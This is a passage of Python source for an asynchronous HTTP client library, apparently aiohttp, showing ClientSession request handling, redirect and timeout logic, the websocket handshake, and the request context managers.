attr.evolve(self._timeout, total=read_timeout)\r\n            if conn_timeout is not None:\r\n                self._timeout = attr.evolve(self._timeout, connect=conn_timeout)\r\n                warnings.warn(\r\n                    "conn_timeout is deprecated, " "use timeout argument instead",\r\n                    DeprecationWarning,\r\n                    stacklevel=2,\r\n                )\r\n        else:\r\n            self._timeout = timeout  # type: ignore[assignment]\r\n            if read_timeout is not sentinel:\r\n                raise ValueError(\r\n                    "read_timeout and timeout parameters "\r\n                    "conflict, please setup "\r\n                    "timeout.read"\r\n                )\r\n            if conn_timeout is not None:\r\n                raise ValueError(\r\n                    "conn_timeout and timeout parameters "\r\n                    "conflict, please setup "\r\n                    "timeout.connect"\r\n                )\r\n        self._raise_for_status = raise_for_status\r\n        self._auto_decompress = auto_decompress\r\n        self._trust_env = trust_env\r\n        self._requote_redirect_url = requote_redirect_url\r\n        self._read_bufsize = read_bufsize\r\n\r\n        # Convert to list of tuples\r\n        if headers:\r\n            real_headers = CIMultiDict(headers)  # type: CIMultiDict[str]\r\n        else:\r\n            real_headers = CIMultiDict()\r\n        self._default_headers = real_headers  # type: CIMultiDict[str]\r\n        if skip_auto_headers is not None:\r\n            self._skip_auto_headers = frozenset(istr(i) for i in skip_auto_headers)\r\n        else:\r\n            self._skip_auto_headers = frozenset()\r\n\r\n        self._request_class = request_class\r\n        self._response_class = response_class\r\n        self._ws_response_class = ws_response_class\r\n\r\n        self._trace_configs = trace_configs or []\r\n        for trace_config in self._trace_configs:\r\n            trace_config.freeze()\r\n\r\n    def __init_subclass__(cls: Type["ClientSession"]) -> None:\r\n        warnings.warn(\r\n            "Inheritance class {} from ClientSession "\r\n            "is discouraged".format(cls.__name__),\r\n            DeprecationWarning,\r\n            stacklevel=2,\r\n        )\r\n\r\n    if DEBUG:\r\n\r\n        def __setattr__(self, name: str, val: Any) -> None:\r\n            if name not in self.ATTRS:\r\n                warnings.warn(\r\n                    "Setting custom ClientSession.{} attribute "\r\n                    "is discouraged".format(name),\r\n                    DeprecationWarning,\r\n                    stacklevel=2,\r\n                )\r\n            super().__setattr__(name, val)\r\n\r\n    def __del__(self, _warnings: Any = warnings) -> None:\r\n        if not self.closed:\r\n            if PY_36:\r\n                kwargs = {"source": self}\r\n            else:\r\n                kwargs = {}\r\n            _warnings.warn(\r\n                f"Unclosed client session {self!r}", ResourceWarning, **kwargs\r\n            )\r\n            context = {"client_session": self, "message": "Unclosed client session"}\r\n            if self._source_traceback is not None:\r\n                context["source_traceback"] = self._source_traceback\r\n            self._loop.call_exception_handler(context)\r\n\r\n    def request(\r\n        self, method: str, url: StrOrURL, **kwargs: Any\r\n    ) -> "_RequestContextManager":\r\n        """Perform HTTP request."""\r\n        return _RequestContextManager(self._request(method, url, **kwargs))\r\n\r\n    def _build_url(self, str_or_url: StrOrURL) -> URL:\r\n        url = URL(str_or_url)\r\n        if self._base_url is None:\r\n            return url\r\n        else:\r\n            assert not url.is_absolute() and url.path.startswith("/")\r\n            return self._base_url.join(url)\r\n\r\n    async def _request(\r\n        self,\r\n        method: str,\r\n        str_or_url: StrOrURL,\r\n        *,\r\n        params: Optional[Mapping[str, str]] = None,\r\n        data: Any = None,\r\n        json: Any = None,\r\n        cookies: Optional[LooseCookies] = None,\r\n        headers: Optional[LooseHeaders] = None,\r\n        skip_auto_headers: Optional[Iterable[str]] = None,\r\n        auth: Optional[BasicAuth] = None,\r\n        allow_redirects: bool = True,\r\n        max_redirects: int = 10,\r\n        compress: Optional[str] = None,\r\n        chunked: Optional[bool] = None,\r\n        expect100: bool = False,\r\n        raise_for_status: Optional[bool] = None,\r\n        read_until_eof: bool = True,\r\n        proxy: Optional[StrOrURL] = None,\r\n        proxy_auth: Optional[BasicAuth] = None,\r\n        timeout: Union[ClientTimeout, object] = sentinel,\r\n        verify_ssl: Optional[bool] = None,\r\n        fingerprint: Optional[bytes] = None,\r\n        ssl_context: Optional[SSLContext] = None,\r\n        ssl: Optional[Union[SSLContext, bool, Fingerprint]] = None,\r\n        proxy_headers: Optional[LooseHeaders] = None,\r\n        trace_request_ctx: Optional[SimpleNamespace] = None,\r\n        read_bufsize: Optional[int] = None,\r\n    ) -> ClientResponse:\r\n\r\n        # NOTE: timeout clamps existing connect and read timeouts.  We cannot\r\n        # set the default to None because we need to detect if the user wants\r\n        # to use the existing timeouts by setting timeout to None.\r\n\r\n        if self.closed:\r\n            raise RuntimeError("Session is closed")\r\n\r\n        ssl = _merge_ssl_params(ssl, verify_ssl, ssl_context, fingerprint)\r\n\r\n        if data is not None and json is not None:\r\n            raise ValueError(\r\n                "data and json parameters can not be used at the same time"\r\n            )\r\n        elif json is not None:\r\n            data = payload.JsonPayload(json, dumps=self._json_serialize)\r\n\r\n        if not isinstance(chunked, bool) and chunked is not None:\r\n            warnings.warn("Chunk size is deprecated #1615", DeprecationWarning)\r\n\r\n        redirects = 0\r\n        history = []\r\n        version = self._version\r\n\r\n        # Merge with default headers and transform to CIMultiDict\r\n        headers = self._prepare_headers(headers)\r\n        proxy_headers = self._prepare_headers(proxy_headers)\r\n\r\n        try:\r\n            url = self._build_url(str_or_url)\r\n        except ValueError as e:\r\n            raise InvalidURL(str_or_url) from e\r\n\r\n        skip_headers = set(self._skip_auto_headers)\r\n        if skip_auto_headers is not None:\r\n            for i in skip_auto_headers:\r\n                skip_headers.add(istr(i))\r\n\r\n        if proxy is not None:\r\n            try:\r\n                proxy = URL(proxy)\r\n            except ValueError as e:\r\n                raise InvalidURL(proxy) from e\r\n\r\n        if timeout is sentinel:\r\n            real_timeout = self._timeout  # type: ClientTimeout\r\n        else:\r\n            if not isinstance(timeout, ClientTimeout):\r\n                real_timeout = ClientTimeout(total=timeout)  # type: ignore[arg-type]\r\n            else:\r\n                real_timeout = timeout\r\n        # timeout is cumulative for all request operations\r\n        # (request, redirects, responses, data consuming)\r\n        tm = TimeoutHandle(self._loop, real_timeout.total)\r\n        handle = tm.start()\r\n\r\n        if read_bufsize is None:\r\n            read_bufsize = self._read_bufsize\r\n\r\n        traces = [\r\n            Trace(\r\n                self,\r\n                trace_config,\r\n                trace_config.trace_config_ctx(trace_request_ctx=trace_request_ctx),\r\n            )\r\n            for trace_config in self._trace_configs\r\n        ]\r\n\r\n        for trace in traces:\r\n            await trace.send_request_start(method, url.update_query(params), headers)\r\n\r\n        timer = tm.timer()\r\n        try:\r\n            with timer:\r\n                while True:\r\n                    url, auth_from_url = strip_auth_from_url(url)\r\n                    if auth and auth_from_url:\r\n                        raise ValueError(\r\n                            "Cannot combine AUTH argument with "\r\n                            "credentials encoded in URL"\r\n                        )\r\n\r\n                    if auth is None:\r\n                        auth = auth_from_url\r\n                    if auth is None:\r\n                        auth = self._default_auth\r\n                    # It would be confusing if we support explicit\r\n                    # Authorization header with auth argument\r\n                    if (\r\n                        headers is not None\r\n                        and auth is not None\r\n                        and hdrs.AUTHORIZATION in headers\r\n                    ):\r\n                        raise ValueError(\r\n                            "Cannot combine AUTHORIZATION header "\r\n                            "with AUTH argument or credentials "\r\n                            "encoded in URL"\r\n                        )\r\n\r\n                    all_cookies = self._cookie_jar.filter_cookies(url)\r\n\r\n                    if cookies is not None:\r\n                        tmp_cookie_jar = CookieJar()\r\n                        tmp_cookie_jar.update_cookies(cookies)\r\n                        req_cookies = tmp_cookie_jar.filter_cookies(url)\r\n                        if req_cookies:\r\n                            all_cookies.load(req_cookies)\r\n\r\n                    if proxy is not None:\r\n                        proxy = URL(proxy)\r\n                    elif self._trust_env:\r\n                        with suppress(LookupError):\r\n                            proxy, proxy_auth = get_env_proxy_for_url(url)\r\n\r\n                    req = self._request_class(\r\n                        method,\r\n                        url,\r\n                        params=params,\r\n                        headers=headers,\r\n                        skip_auto_headers=skip_headers,\r\n                        data=data,\r\n                        cookies=all_cookies,\r\n                        auth=auth,\r\n                        version=version,\r\n                        compress=compress,\r\n                        chunked=chunked,\r\n                        expect100=expect100,\r\n                        loop=self._loop,\r\n                        response_class=self._response_class,\r\n                        proxy=proxy,\r\n                        proxy_auth=proxy_auth,\r\n                        timer=timer,\r\n                        session=self,\r\n                        ssl=ssl,\r\n                        proxy_headers=proxy_headers,\r\n                        traces=traces,\r\n                    )\r\n\r\n                    # connection timeout\r\n                    try:\r\n                        async with ceil_timeout(real_timeout.connect):\r\n                            assert self._connector is not None\r\n                            conn = await self._connector.connect(\r\n                                req, traces=traces, timeout=real_timeout\r\n                            )\r\n                    except asyncio.TimeoutError as exc:\r\n                        raise ServerTimeoutError(\r\n                            "Connection timeout " "to host {}".format(url)\r\n                        ) from exc\r\n\r\n                    assert conn.transport is not None\r\n\r\n                    assert conn.protocol is not None\r\n                    conn.protocol.set_response_params(\r\n                        timer=timer,\r\n                        skip_payload=method.upper() == "HEAD",\r\n                        read_until_eof=read_until_eof,\r\n                        auto_decompress=self._auto_decompress,\r\n                        read_timeout=real_timeout.sock_read,\r\n                        read_bufsize=read_bufsize,\r\n                    )\r\n\r\n                    try:\r\n                        try:\r\n                            resp = await req.send(conn)\r\n                            try:\r\n                                await resp.start(conn)\r\n                            except BaseException:\r\n                                resp.close()\r\n                                raise\r\n                        except BaseException:\r\n                            conn.close()\r\n                            raise\r\n                    except ClientError:\r\n                        raise\r\n                    except OSError as exc:\r\n                        raise ClientOSError(*exc.args) from exc\r\n\r\n                    self._cookie_jar.update_cookies(resp.cookies, resp.url)\r\n\r\n                    # redirects\r\n                    if resp.status in (301, 302, 303, 307, 308) and allow_redirects:\r\n\r\n                        for trace in traces:\r\n                            await trace.send_request_redirect(\r\n                                method, url.update_query(params), headers, resp\r\n                            )\r\n\r\n                        redirects += 1\r\n                        history.append(resp)\r\n                        if max_redirects and redirects >= max_redirects:\r\n                            resp.close()\r\n                            raise TooManyRedirects(\r\n                                history[0].request_info, tuple(history)\r\n                            )\r\n\r\n                        # For 301 and 302, mimic IE, now changed in RFC\r\n                        # https://github.com/kennethreitz/requests/pull/269\r\n                        if (resp.status == 303 and resp.method != hdrs.METH_HEAD) or (\r\n                            resp.status in (301, 302) and resp.method == hdrs.METH_POST\r\n                        ):\r\n                            method = hdrs.METH_GET\r\n                            data = None\r\n                            if headers.get(hdrs.CONTENT_LENGTH):\r\n                                headers.pop(hdrs.CONTENT_LENGTH)\r\n\r\n                        r_url = resp.headers.get(hdrs.LOCATION) or resp.headers.get(\r\n                            hdrs.URI\r\n                        )\r\n                        if r_url is None:\r\n                            # see github.com/aio-libs/aiohttp/issues/2022\r\n                            break\r\n                        else:\r\n                            # reading from correct redirection\r\n                            # response is forbidden\r\n                            resp.release()\r\n\r\n                        try:\r\n                            parsed_url = URL(\r\n                                r_url, encoded=not self._requote_redirect_url\r\n                            )\r\n\r\n                        except ValueError as e:\r\n                            raise InvalidURL(r_url) from e\r\n\r\n                        scheme = parsed_url.scheme\r\n                        if scheme not in ("http", "https", ""):\r\n                            resp.close()\r\n                            raise ValueError("Can redirect only to http or https")\r\n                        elif not scheme:\r\n                            parsed_url = url.join(parsed_url)\r\n\r\n                        if url.origin() != parsed_url.origin():\r\n                            auth = None\r\n                            headers.pop(hdrs.AUTHORIZATION, None)\r\n\r\n                        url = parsed_url\r\n                        params = None\r\n                        resp.release()\r\n                        continue\r\n\r\n                    break\r\n\r\n            # check response status\r\n            if raise_for_status is None:\r\n                raise_for_status = self._raise_for_status\r\n            if raise_for_status:\r\n                resp.raise_for_status()\r\n\r\n            # register connection\r\n            if handle is not None:\r\n                if resp.connection is not None:\r\n                    resp.connection.add_callback(handle.cancel)\r\n                else:\r\n                    handle.cancel()\r\n\r\n            resp._history = tuple(history)\r\n\r\n            for trace in traces:\r\n                await trace.send_request_end(\r\n                    method, url.update_query(params), headers, resp\r\n                )\r\n            return resp\r\n\r\n        except BaseException as e:\r\n            # cleanup timer\r\n            tm.close()\r\n            if handle:\r\n                handle.cancel()\r\n                handle = None\r\n\r\n            for trace in traces:\r\n                await trace.send_request_exception(\r\n                    method, url.update_query(params), headers, e\r\n                )\r\n            raise\r\n\r\n    def ws_connect(\r\n        self,\r\n        url: StrOrURL,\r\n        *,\r\n        method: str = hdrs.METH_GET,\r\n        protocols: Iterable[str] = (),\r\n        timeout: float = 10.0,\r\n        receive_timeout: Optional[float] = None,\r\n        autoclose: bool = True,\r\n        autoping: bool = True,\r\n        heartbeat: Optional[float] = None,\r\n        auth: Optional[BasicAuth] = None,\r\n        origin: Optional[str] = None,\r\n        params: Optional[Mapping[str, str]] = None,\r\n        headers: Optional[LooseHeaders] = None,\r\n        proxy: Optional[StrOrURL] = None,\r\n        proxy_auth: Optional[BasicAuth] = None,\r\n        ssl: Union[SSLContext, bool, None, Fingerprint] = None,\r\n        verify_ssl: Optional[bool] = None,\r\n        fingerprint: Optional[bytes] = None,\r\n        ssl_context: Optional[SSLContext] = None,\r\n        proxy_headers: Optional[LooseHeaders] = None,\r\n        compress: int = 0,\r\n        max_msg_size: int = 4 * 1024 * 1024,\r\n    ) -> "_WSRequestContextManager":\r\n        """Initiate websocket connection."""\r\n        return _WSRequestContextManager(\r\n            self._ws_connect(\r\n                url,\r\n                method=method,\r\n                protocols=protocols,\r\n                timeout=timeout,\r\n                receive_timeout=receive_timeout,\r\n                autoclose=autoclose,\r\n                autoping=autoping,\r\n                heartbeat=heartbeat,\r\n                auth=auth,\r\n                origin=origin,\r\n                params=params,\r\n                headers=headers,\r\n                proxy=proxy,\r\n                proxy_auth=proxy_auth,\r\n                ssl=ssl,\r\n                verify_ssl=verify_ssl,\r\n                fingerprint=fingerprint,\r\n                ssl_context=ssl_context,\r\n                proxy_headers=proxy_headers,\r\n                compress=compress,\r\n                max_msg_size=max_msg_size,\r\n            )\r\n        )\r\n\r\n    async def _ws_connect(\r\n        self,\r\n        url: StrOrURL,\r\n        *,\r\n        method: str = hdrs.METH_GET,\r\n        protocols: Iterable[str] = (),\r\n        timeout: float = 10.0,\r\n        receive_timeout: Optional[float] = None,\r\n        autoclose: bool = True,\r\n        autoping: bool = True,\r\n        heartbeat: Optional[float] = None,\r\n        auth: Optional[BasicAuth] = None,\r\n        origin: Optional[str] = None,\r\n        params: Optional[Mapping[str, str]] = None,\r\n        headers: Optional[LooseHeaders] = None,\r\n        proxy: Optional[StrOrURL] = None,\r\n        proxy_auth: Optional[BasicAuth] = None,\r\n        ssl: Union[SSLContext, bool, None, Fingerprint] = None,\r\n        verify_ssl: Optional[bool] = None,\r\n        fingerprint: Optional[bytes] = None,\r\n        ssl_context: Optional[SSLContext] = None,\r\n        proxy_headers: Optional[LooseHeaders] = None,\r\n        compress: int = 0,\r\n        max_msg_size: int = 4 * 1024 * 1024,\r\n    ) -> ClientWebSocketResponse:\r\n\r\n        if headers is None:\r\n            real_headers = CIMultiDict()  # type: CIMultiDict[str]\r\n        else:\r\n            real_headers = CIMultiDict(headers)\r\n\r\n        default_headers = {\r\n            hdrs.UPGRADE: "websocket",\r\n            hdrs.CONNECTION: "upgrade",\r\n            hdrs.SEC_WEBSOCKET_VERSION: "13",\r\n        }\r\n\r\n        for key, value in default_headers.items():\r\n            real_headers.setdefault(key, value)\r\n\r\n        sec_key = base64.b64encode(os.urandom(16))\r\n        real_headers[hdrs.SEC_WEBSOCKET_KEY] = sec_key.decode()\r\n\r\n        if protocols:\r\n            real_headers[hdrs.SEC_WEBSOCKET_PROTOCOL] = ",".join(protocols)\r\n        if origin is not None:\r\n            real_headers[hdrs.ORIGIN] = origin\r\n        if compress:\r\n            extstr = ws_ext_gen(compress=compress)\r\n            real_headers[hdrs.SEC_WEBSOCKET_EXTENSIONS] = extstr\r\n\r\n        ssl = _merge_ssl_params(ssl, verify_ssl, ssl_context, fingerprint)\r\n\r\n        # send request\r\n        resp = await self.request(\r\n            method,\r\n            url,\r\n            params=params,\r\n            headers=real_headers,\r\n            read_until_eof=False,\r\n            auth=auth,\r\n            proxy=proxy,\r\n            proxy_auth=proxy_auth,\r\n            ssl=ssl,\r\n            proxy_headers=proxy_headers,\r\n        )\r\n\r\n        try:\r\n            # check handshake\r\n            if resp.status != 101:\r\n                raise WSServerHandshakeError(\r\n                    resp.request_info,\r\n                    resp.history,\r\n                    message="Invalid response status",\r\n                    status=resp.status,\r\n                    headers=resp.headers,\r\n                )\r\n\r\n            if resp.headers.get(hdrs.UPGRADE, "").lower() != "websocket":\r\n                raise WSServerHandshakeError(\r\n                    resp.request_info,\r\n                    resp.history,\r\n                    message="Invalid upgrade header",\r\n                    status=resp.status,\r\n                    headers=resp.headers,\r\n                )\r\n\r\n            if resp.headers.get(hdrs.CONNECTION, "").lower() != "upgrade":\r\n                raise WSServerHandshakeError(\r\n                    resp.request_info,\r\n                    resp.history,\r\n                    message="Invalid connection header",\r\n                    status=resp.status,\r\n                    headers=resp.headers,\r\n                )\r\n\r\n            # key calculation\r\n            r_key = resp.headers.get(hdrs.SEC_WEBSOCKET_ACCEPT, "")\r\n            match = base64.b64encode(hashlib.sha1(sec_key + WS_KEY).digest()).decode()\r\n            if r_key != match:\r\n                raise WSServerHandshakeError(\r\n                    resp.request_info,\r\n                    resp.history,\r\n                    message="Invalid challenge response",\r\n                    status=resp.status,\r\n                    headers=resp.headers,\r\n                )\r\n\r\n            # websocket protocol\r\n            protocol = None\r\n            if protocols and hdrs.SEC_WEBSOCKET_PROTOCOL in resp.headers:\r\n                resp_protocols = [\r\n                    proto.strip()\r\n                    for proto in resp.headers[hdrs.SEC_WEBSOCKET_PROTOCOL].split(",")\r\n                ]\r\n\r\n                for proto in resp_protocols:\r\n                    if proto in protocols:\r\n                        protocol = proto\r\n                        break\r\n\r\n            # websocket compress\r\n            notakeover = False\r\n            if compress:\r\n                compress_hdrs = resp.headers.get(hdrs.SEC_WEBSOCKET_EXTENSIONS)\r\n                if compress_hdrs:\r\n                    try:\r\n                        compress, notakeover = ws_ext_parse(compress_hdrs)\r\n                    except WSHandshakeError as exc:\r\n                        raise WSServerHandshakeError(\r\n                            resp.request_info,\r\n                            resp.history,\r\n                            message=exc.args[0],\r\n                            status=resp.status,\r\n                            headers=resp.headers,\r\n                        ) from exc\r\n                else:\r\n                    compress = 0\r\n                    notakeover = False\r\n\r\n            conn = resp.connection\r\n            assert conn is not None\r\n            conn_proto = conn.protocol\r\n            assert conn_proto is not None\r\n            transport = conn.transport\r\n            assert transport is not None\r\n            reader = FlowControlDataQueue(\r\n                conn_proto, 2 ** 16, loop=self._loop\r\n            )  # type: FlowControlDataQueue[WSMessage]\r\n            conn_proto.set_parser(WebSocketReader(reader, max_msg_size), reader)\r\n            writer = WebSocketWriter(\r\n                conn_proto,\r\n                transport,\r\n                use_mask=True,\r\n                compress=compress,\r\n                notakeover=notakeover,\r\n            )\r\n        except BaseException:\r\n            resp.close()\r\n            raise\r\n        else:\r\n            return self._ws_response_class(\r\n                reader,\r\n                writer,\r\n                protocol,\r\n                resp,\r\n                timeout,\r\n                autoclose,\r\n                autoping,\r\n                self._loop,\r\n                receive_timeout=receive_timeout,\r\n                heartbeat=heartbeat,\r\n                compress=compress,\r\n                client_notakeover=notakeover,\r\n            )\r\n\r\n    def _prepare_headers(self, headers: Optional[LooseHeaders]) -> "CIMultiDict[str]":\r\n        """Add default headers and transform it to CIMultiDict"""\r\n        # Convert headers to MultiDict\r\n        result = CIMultiDict(self._default_headers)\r\n        if headers:\r\n            if not isinstance(headers, (MultiDictProxy, MultiDict)):\r\n                headers = CIMultiDict(headers)\r\n            added_names = set()  # type: Set[str]\r\n            for key, value in headers.items():\r\n                if key in added_names:\r\n                    result.add(key, value)\r\n                else:\r\n                    result[key] = value\r\n                    added_names.add(key)\r\n        return result\r\n\r\n    def get(\r\n        self, url: StrOrURL, *, allow_redirects: bool = True, **kwargs: Any\r\n    ) -> "_RequestContextManager":\r\n        """Perform HTTP GET request."""\r\n        return _RequestContextManager(\r\n            self._request(hdrs.METH_GET, url, allow_redirects=allow_redirects, **kwargs)\r\n        )\r\n\r\n    def options(\r\n        self, url: StrOrURL, *, allow_redirects: bool = True, **kwargs: Any\r\n    ) -> "_RequestContextManager":\r\n        """Perform HTTP OPTIONS request."""\r\n        return _RequestContextManager(\r\n            self._request(\r\n                hdrs.METH_OPTIONS, url, allow_redirects=allow_redirects, **kwargs\r\n            )\r\n        )\r\n\r\n    def head(\r\n        self, url: StrOrURL, *, allow_redirects: bool = False, **kwargs: Any\r\n    ) -> "_RequestContextManager":\r\n        """Perform HTTP HEAD request."""\r\n        return _RequestContextManager(\r\n            self._request(\r\n                hdrs.METH_HEAD, url, allow_redirects=allow_redirects, **kwargs\r\n            )\r\n        )\r\n\r\n    def post(\r\n        self, url: StrOrURL, *, data: Any = None, **kwargs: Any\r\n    ) -> "_RequestContextManager":\r\n        """Perform HTTP POST request."""\r\n        return _RequestContextManager(\r\n            self._request(hdrs.METH_POST, url, data=data, **kwargs)\r\n        )\r\n\r\n    def put(\r\n        self, url: StrOrURL, *, data: Any = None, **kwargs: Any\r\n    ) -> "_RequestContextManager":\r\n        """Perform HTTP PUT request."""\r\n        return _RequestContextManager(\r\n            self._request(hdrs.METH_PUT, url, data=data, **kwargs)\r\n        )\r\n\r\n    def patch(\r\n        self, url: StrOrURL, *, data: Any = None, **kwargs: Any\r\n    ) -> "_RequestContextManager":\r\n        """Perform HTTP PATCH request."""\r\n        return _RequestContextManager(\r\n            self._request(hdrs.METH_PATCH, url, data=data, **kwargs)\r\n        )\r\n\r\n    def delete(self, url: StrOrURL, **kwargs: Any) -> "_RequestContextManager":\r\n        """Perform HTTP DELETE request."""\r\n        return _RequestContextManager(self._request(hdrs.METH_DELETE, url, **kwargs))\r\n\r\n    async def close(self) -> None:\r\n        """Close underlying connector.\r\n\r\n        Release all acquired resources.\r\n        """\r\n        if not self.closed:\r\n            if self._connector is not None and self._connector_owner:\r\n                await self._connector.close()\r\n            self._connector = None\r\n\r\n    @property\r\n    def closed(self) -> bool:\r\n        """Is client session closed.\r\n\r\n        A readonly property.\r\n        """\r\n        return self._connector is None or self._connector.closed\r\n\r\n    @property\r\n    def connector(self) -> Optional[BaseConnector]:\r\n        """Connector instance used for the session."""\r\n        return self._connector\r\n\r\n    @property\r\n    def cookie_jar(self) -> AbstractCookieJar:\r\n        """The session cookies."""\r\n        return self._cookie_jar\r\n\r\n    @property\r\n    def version(self) -> Tuple[int, int]:\r\n        """The session HTTP protocol version."""\r\n        return self._version\r\n\r\n    @property\r\n    def requote_redirect_url(self) -> bool:\r\n        """Do URL requoting on redirection handling."""\r\n        return self._requote_redirect_url\r\n\r\n    @requote_redirect_url.setter\r\n    def requote_redirect_url(self, val: bool) -> None:\r\n        """Do URL requoting on redirection handling."""\r\n        warnings.warn(\r\n            "session.requote_redirect_url modification " "is deprecated #2778",\r\n            DeprecationWarning,\r\n            stacklevel=2,\r\n        )\r\n        self._requote_redirect_url = val\r\n\r\n    @property\r\n    def loop(self) -> asyncio.AbstractEventLoop:\r\n        """Session\'s loop."""\r\n        warnings.warn(\r\n            "client.loop property is deprecated", DeprecationWarning, stacklevel=2\r\n        )\r\n        return self._loop\r\n\r\n    @property\r\n    def timeout(self) -> Union[object, ClientTimeout]:\r\n        """Timeout for the session."""\r\n        return self._timeout\r\n\r\n    @property\r\n    def headers(self) -> "CIMultiDict[str]":\r\n        """The default headers of the client session."""\r\n        return self._default_headers\r\n\r\n    @property\r\n    def skip_auto_headers(self) -> FrozenSet[istr]:\r\n        """Headers for which autogeneration should be skipped"""\r\n        return self._skip_auto_headers\r\n\r\n    @property\r\n    def auth(self) -> Optional[BasicAuth]:\r\n        """An object that represents HTTP Basic Authorization"""\r\n        return self._default_auth\r\n\r\n    @property\r\n    def json_serialize(self) -> JSONEncoder:\r\n        """Json serializer callable"""\r\n        return self._json_serialize\r\n\r\n    @property\r\n    def connector_owner(self) -> bool:\r\n        """Should connector be closed on session closing"""\r\n        return self._connector_owner\r\n\r\n    @property\r\n    def raise_for_status(\r\n        self,\r\n    ) -> Union[bool, Callable[[ClientResponse], Awaitable[None]]]:\r\n        """Should `ClientResponse.raise_for_status()` be called for each response."""\r\n        return self._raise_for_status\r\n\r\n    @property\r\n    def auto_decompress(self) -> bool:\r\n        """Should the body response be automatically decompressed."""\r\n        return self._auto_decompress\r\n\r\n    @property\r\n    def trust_env(self) -> bool:\r\n        """\r\n        Should proxies information from environment or netrc be trusted.\r\n\r\n        Information is from HTTP_PROXY / HTTPS_PROXY environment variables\r\n        or ~/.netrc file if present.\r\n        """\r\n        return self._trust_env\r\n\r\n    @property\r\n    def trace_configs(self) -> List[TraceConfig]:\r\n        """A list of TraceConfig instances used for client tracing"""\r\n        return self._trace_configs\r\n\r\n    def detach(self) -> None:\r\n        """Detach connector from session without closing the former.\r\n\r\n        Session is switched to closed state anyway.\r\n        """\r\n        self._connector = None\r\n\r\n    def __enter__(self) -> None:\r\n        raise TypeError("Use async with instead")\r\n\r\n    def __exit__(\r\n        self,\r\n        exc_type: Optional[Type[BaseException]],\r\n        exc_val: Optional[BaseException],\r\n        exc_tb: Optional[TracebackType],\r\n    ) -> None:\r\n        # __exit__ should exist in pair with __enter__ but never executed\r\n        pass  # pragma: no cover\r\n\r\n    async def __aenter__(self) -> "ClientSession":\r\n        return self\r\n\r\n    async def __aexit__(\r\n        self,\r\n        exc_type: Optional[Type[BaseException]],\r\n        exc_val: Optional[BaseException],\r\n        exc_tb: Optional[TracebackType],\r\n    ) -> None:\r\n        await self.close()\r\n\r\n\r\nclass _BaseRequestContextManager(Coroutine[Any, Any, _RetType], Generic[_RetType]):\r\n\r\n    __slots__ = ("_coro", "_resp")\r\n\r\n    def __init__(self, coro: Coroutine["asyncio.Future[Any]", None, _RetType]) -> None:\r\n        self._coro = coro\r\n\r\n    def send(self, arg: None) -> "asyncio.Future[Any]":\r\n        return self._coro.send(arg)\r\n\r\n    def throw(self, arg: BaseException) -> None:  # type: ignore[arg-type,override]\r\n        self._coro.throw(arg)\r\n\r\n    def close(self) -> None:\r\n        return self._coro.close()\r\n\r\n    def __await__(self) -> Generator[Any, None, _RetType]:\r\n        ret = self._coro.__await__()\r\n        return ret\r\n\r\n    def __iter__(self) -> Generator[Any, None, _RetType]:\r\n        return self.__await__()\r\n\r\n    async def __aenter__(self) -> _RetType:\r\n        self._resp = await self._coro\r\n        return self._resp\r\n\r\n\r\nclass _RequestContextManager(_BaseRequestContextManager[ClientResponse]):\r\n    __slots__ = ()\r\n\r\n    async def __aexit__(\r\n        self,\r\n        exc_type: Optional[Type[BaseException]],\r\n        exc: Optional[BaseException],\r\n        tb: Optional[TracebackType],\r\n    ) -> None:\r\n        # We\'re basing behavior on the exception as it can be caused by\r\n        # user code unrelated to the status of the connection.  If you\r\n        # would like to close a connection you must do that\r\n        # explicitly.  Otherwise connection error handling should kick in\r\n        # and close/recycle the connection as required.\r\n        self._resp.release()\r\n\r\n\r\nclass _WSRequestContextManager(_BaseRequestContextManager[ClientWebSocketResponse]):\r\n    __slots__ = ()\r\n\r\n    async def __aexit__(\r\n        self,\r\n        exc_type: Optional[Type[BaseException]],\r\n        exc: Optional[BaseException],\r\n        tb: Optional[TracebackType],\r\n    ) -> None:\r\n        await self._resp.close()\r\n\r\n\r\nclass _SessionRequestContextManager:\r\n\r\n    __slots__ = ("_coro", "_resp", "_session")\r\n\r\n    def __init__(\r\n        self,\r\n        coro: Coroutine["asyncio.Future[Any]", None, ClientResponse],\r\n        session: ClientSession,\r\n    ) -> None:\r\n        self._coro = coro\r\n        self._resp = None  # type: Optional[ClientResponse]\r\n        self._session = session\r\n\r\n    async def __aenter__(self) -> ClientResponse:\r\n        try:\r\n            self._resp = await self._coro\r\n        except BaseException:\r\n            await self._session.close()\r\n            raise\r\n        else:\r\n            return self._resp\r\n\r\n    async def __aexit__(\r\n        self,\r\n        exc_type: Optional[Type[BaseException]],\r\n        exc: Optional[BaseException],\r\n        tb: Optional[TracebackType],\r\n    ) -> None:\r\n        assert self._resp is not None\r\n        self._resp.close()\r\n        await self._session.close()\r\n\r\n\r\ndef request(\r\n    method: str,\r\n    url: StrOrURL,\r\n    *,\r\n    params: Optional[Mapping[str, str]] = None,\r\n    data: Any = None,\r\n    json: Any = None,\r\n    headers: Optional[LooseHeaders] = None,\r\n    skip_auto_headers: Optional[Iterable[str]] = None,\r\n    auth: Optional[BasicAuth] = None,\r\n    allow_redirects: bool = True,\r\n    max_redirects: int = 10,\r\n    compress: Optional[str] = None,\r\n    chunked: Optional[bool] = None,\r\n    expect100: bool = False,\r\n    raise_for_status: Optional[bool] = None,\r\n    read_until_eof: bool = True,\r\n    proxy: Optional[StrOrURL] = None,\r\n    proxy_auth: Optional[BasicAuth] = None,\r\n    timeout: Union[ClientTimeout, object] = sentinel,\r\n    cookies: Optional[LooseCookies] = None,\r\n    version: HttpVersion = http.HttpVersion11,\r\n    connector: Optional[BaseConnector] = None,\r\n    read_bufsize: Optional[int] = None,\r\n    loop: Optional[asyncio.AbstractEventLoop] = None,\r\n) -> _SessionRequestContextManager:\r\n    """Constructs and sends a request.\r\n\r\n    Returns response object.\r\n    method - HTTP method\r\n    url - request url\r\n    params - (optional) Dictionary or bytes to be sent in the query\r\n      string of the new request\r\n    data - (optional) Dictionary, bytes, or file-like object to\r\n      send in the body of the request\r\n    json - (optional) Any json compatible python object\r\n    headers - (optional) Dictionary of HTTP Headers to send with\r\n      the request\r\n    cookies - (optional) Dict object to send with the request\r\n    auth - (optional) BasicAuth named tuple represent HTTP Basic Auth\r\n    auth - aiohttp.helpers.BasicAuth\r\n    allow_redirects - (optional) If set to False, do not follow\r\n      redirects\r\n    version - Request HTTP version.\r\n    compress - Set to True if request has to be compressed\r\n       with deflate encoding.\r\n    chunked - Set to chunk size for chunked transfer encoding.\r\n    expect100 - Expect 100-continue response from server.\r\n    connector - BaseConnector sub-class instance to support\r\n       connection pooling.\r\n    read_until_eof - Read response until eof if 